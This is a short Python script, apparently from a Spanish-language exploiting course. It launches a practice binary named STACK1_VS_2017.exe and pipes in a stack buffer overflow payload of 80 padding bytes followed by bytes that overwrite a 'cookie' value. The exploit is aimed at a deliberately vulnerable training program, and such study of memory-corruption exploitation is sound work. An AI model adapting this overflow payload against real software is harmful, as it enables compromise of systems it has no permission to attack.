import sys
from subprocess import Popen, PIPE

buffer = b"A" * 80
cookie = b"\x44\x43\x42\x41"

payload = buffer + cookie

p1 = Popen("STACK1_VS_2017.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()
